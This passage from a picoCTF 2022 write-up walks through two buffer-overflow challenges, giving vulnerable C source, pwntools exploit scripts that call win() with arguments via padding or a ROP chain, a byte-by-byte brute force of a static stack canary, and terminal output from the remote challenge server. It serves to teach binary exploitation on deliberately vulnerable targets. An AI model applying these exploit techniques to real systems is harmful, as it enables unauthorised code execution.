  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
{% endccb %}

Looking at the `win()` function, we can see that two arguments are required that need to be passed into the function to receive the flag. Two guard clauses lay above the flag print:

{% codeblock lang:c first_line:19 %}
  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
{% endcodeblock %}

The goal is simple: call `win(0xCAFEF00D, 0xF00DF00D)`! We'll be doing it the hard way (for a learning experience), in addition to a more advanced easy way. Let's get started.

### I: The Hard Way 🐢

We can apply a lot from what we learned in `Buffer overflow 1`. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we'll get actual number here, I won't include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump's fault address (`$eip`) and throw it into `cyclic_find()`:

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 -q
<span class="meta prompt_">>>> </span>from pwn import *
<span class="meta prompt_">>>> </span>elf = context.binary = ELF(&apos;./vuln&apos;)
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
<span class="meta prompt_">>>> </span>p = process(elf.path)
[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 2777
<span class="meta prompt_">>>> </span>p.sendline(cyclic(128))
<span class="meta prompt_">>>> </span>p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 2777)
<span class="meta prompt_">>>> </span>core = Corefile(&apos;./core&apos;)
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffafca40
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>> </span>cyclic_find(0x62616164)
112
{% endccb %}

The next thing we need to know about is the way functions are laid out on the stack. Let's recall the diagram I drew out earlier:

![Stack Diagram](asset/pico22/buffer-overflow/stack-visual2.png)

If we want to call a function with parameters, we'll need to include the base pointer alongside a return address, which can simply be `main()`. With this, we can basically copy our script over from `Buffer overflow 1` with a few tweaks to the payload:

{% ccb caption:buffer-overflow-2.py lang:py gutter1:1-25 url:'gist.github.com/jktrn/c6c17fc63ca801d0b64d8bb5acc982c1' url_text:'github gist link' %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # creates local process w/ elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parses core dump file

payload = flat([
    {cyclic_find(core.eip): elf.symbols.win},    # pads win address
    elf.symbols.main,                            # return address
    0xCAFEF00D,                                  # parameter 1
    0xF00DF00D                                   # parameter 2
])

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()
{% endccb %}

Let's run it on the remote server:

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 buffer-overflow-2.py REMOTE
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
-11 (SIGSEGV) (pid 3988)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffca3290
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
\xf0\xfe\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua-<br>aaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04r\x93\x04
picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

### II: The Easy Way 🐇

But... what if you wanted to be an even **more** lazy pwner? Well, you're in luck, because I present to you: the **[pwntools ROP object](https://docs.pwntools.com/en/stable/rop/rop.html)**! By throwing our elf object into `ROP()` it transforms, and we can use it to automatically call functions and build chains! Here it is in action:

{% codeblock buffer-overflow-2-automated.py lang:py https://gist.github.com/jktrn/a5bfe03bdf5b2d766ef5fa402e9e35d6 [github gist link] %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln' checksec=False)    # sets elf object
rop = ROP(elf)                                         # creates ROP object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # creates local process w/ elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parses core dump file

rop.win(0xCAFEF00D, 0xF00DF00D)                        # Call win() with args
payload = fit({cyclic_find(core.eip): rop.chain()})    # pad ROP chain

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()
{% endcodeblock %}

Let's run it on the remote server:

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
[<span style="color:#277FFF"><b>*</b></span>] Loaded 10 cached gadgets for &apos;./vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
-11 (SIGSEGV) (pid 4993)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffd07fc0
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
    Fault:     0x62616164
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaa-
avaaawaaaxaaayaaazaabbaabcaab\x96\x\xf0\xfe\xca
picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> [<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
{% endccb %}

We've successfully called a function with arguments through buffer overflow!

---

{% challenge %}
title: Buffer overflow 3
level: h2
description: |
  Do you think you can bypass the protection and get the flag?  It looks like Dr. Oswal added a stack canary to this [program](/asset/pico22/buffer-overflow/vuln-3) to protect against buffer overflows. You can view source [here](/asset/pico22/buffer-overflow/vuln-3.c). And connect with it using:  
  `nc saturn.picoctf.net [PORT]`
hints:
  - 1. Maybe there's a smart way to brute-force the canary?
size: 110%
authors:
  - Sanjay C.
  - Palash Oswal
genre: pwn/binary
solvers: enscribe
points: 300
files: '[vuln](/asset/pico22/buffer-overflow/vuln-3), [vuln.c](/asset/pico22/buffer-overflow/vuln-3.c)'
{% endchallenge %}

{% warning %}
Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
{% endwarning %}

{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true terminal:true %}
<span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
{% endccb %}

### I: Finding the Canary 🐦

So, Dr. Oswal apparently implemented a [stack canary](https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/), which is just a **dynamic value** appended to binaries during compilation. It helps detect and mitigate stack smashing attacks, and programs can terminate if they detect the canary being overwritten. Yet, `checksec` didn't find a canary. That's a bit suspicious... but let's check out our source code first:

{% ccb lang:c gutter1:1-80 caption:'vuln-3.c' url:'enscribe.dev/asset/pico22/buffer-overflow/vuln-3.c' url_text:'download source' scrollable:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
      fflush(stdout);
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
{% endccb %}

If you look closely, you might be able to see why `checksec` didn't find a stack canary. That's because it's actually a static variable, being read from a `canary.txt` on the host machine. Canaries that aren't implemented by the compiler are not really canaries!

Knowing that the canary will be four bytes long (defined by `CANARY_SIZE`) and immediately after the 64-byte buffer (defined by `BUFSIZE`), we can write a brute forcing script that can determine the correct canary with a simple trick: **by not fully overwriting the canary the entire time!** Check out this segment of source code:

{% codeblock lang:c first_line:60  %}
   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
      fflush(stdout);
      exit(-1);
   }
{% endcodeblock %}

This uses `memcmp()` to determine if the current canary is the same as the global canary. If it's different, then the program will run `exit(-1)`, which is a really weird/invalid exit code and supposedly represents "[abnormal termination](https://softwareengineering.stackexchange.com/questions/314563/where-did-exit-1-come-from)":

![memcmp1](/asset/pico22/buffer-overflow/memcmp1.svg)

However, if we theoretically overwrite the canary with a single correct byte, `memcmp()` won't detect anything!:

![memcmp2](/asset/pico22/buffer-overflow/memcmp2.svg)

### II: Bypassing the Canary 💨

We can now start writing our script! My plan is to loop through all printable characters for each canary byte, which can be imported from `string`. Let's include that in our pwn boilerplate alongside a simple function that allows us to swap between a local and remote instance:

```py
#!/usr/bin/env python3
from pwn import *
from string import printable

elf = context.binary = ELF("./vuln", checksec=False) # Creates ELF object
host, port = "saturn.picoctf.net", [PORT]
offset = 64

def new_process(): # Specify remote or local instance with CLI argument
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(host, port)
```

Here's the big part: the `get_canary()` function. I'll be using [`pwnlib.log`](https://docs.pwntools.com/en/stable/log.html) for some spicy status messages. My general process for the brute force is visualized here if you're having trouble:

![Brute Force Visual](/asset/pico22/buffer-overflow/brute-visual.svg)

I'll be initially sending 64 + 1 bytes, and slowly appending the correct canary to the end of my payload until the loop has completed four times:

{% codeblock lang:py first_line:15 %}
def get_canary():
    canary = b""
    logger = log.progress("Finding canary...")
    for i in range(1, 5):
        for char in printable:
            with context.quiet: # Hides any other log
                p = new_process()
                p.sendlineafter(b"> ", str(offset + i).encode())
                p.sendlineafter(b"> ", flat([{offset: canary}, char.encode()]))
                output = p.recvall()
                if b"?" in output: # If program doesn't crash
                    canary += char.encode()
                    logger.status(f'"{canary.decode()}"')
                    break
    logger.success(f'"{canary.decode()}"')
    return canary
{% endcodeblock %}

The final thing we need to figure out is the offset between the canary to `$eip`, the pointer register, which we will repopulate with the address of `win()`. We can do this by appending a cyclic pattern to the end of our current payload (64 + 4 canary bytes) and reading the Corefile's crash location, which will be the `$eip`:

(Note: My canary is "abcd" because I put that in my `canary.txt`. It will be different on the remote!)

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 -q
<span class="meta prompt_">>>></span> from pwn import *
<span class="meta prompt_">>>></span> p = process('./vuln')
[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;: pid 1493
<span class="meta prompt_">>>></span> payload = cyclic(64) + b&apos;abcd&apos; + cyclic(128)
<span class="meta prompt_">>>></span> p.sendline(b&apos;196&apos;)
<span class="meta prompt_">>>></span> p.sendline(payload)
<span class="meta prompt_">>>></span> p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 1493)
<span class="meta prompt_">>>></span> core = Corefile(&apos;./core&apos;)
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/core&apos;
    Arch:      i386-32-little
    EIP:       0x61616165
    ESP:       0xffa06160
    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; (0x8048000)
    Fault:     0x61616165
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>></span> cyclic_find(0x61616165)
16
{% endccb %}

The offset is 16, so we'll have to append that amount of bytes to the payload followed by the address of `win()`. I'll combine all sections of our payload together with `flat()`, and then hopefully read the flag from the output:

{% codeblock lang:py first_line:32 %}
canary = get_canary()
p = new_process()
payload = flat([{offset: canary}, {16: elf.symbols.win}])
p.sendlineafter(b"> ", str(len(payload)).encode())
p.sendlineafter(b"> ", payload)
log.success(p.recvall().decode("ISO-8859-1")) # recvallS() didn't work :(
{% endcodeblock %}

Since I segmented my script into parts, I decided against putting a giant codeblock here with the same code as earlier. Instead, I just put it on a [Gist](https://gist.github.com/jktrn/bafbc08bbee179588207e3e3caffde75)! Anyways, here's the full script in action:

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 buffer-overflow-3.py
[<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (162B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port 57427
[<span style="color:#47D4B9"><b>+</b></span>] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
auaaa6^H
    Ok... Now Where&apos;s the Flag?
    picoCTF{Stat1C_c4n4r13s_4R3_b4D_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

We've successfully performed a brute force on a vulnerable static canary!

{% flagcounter %}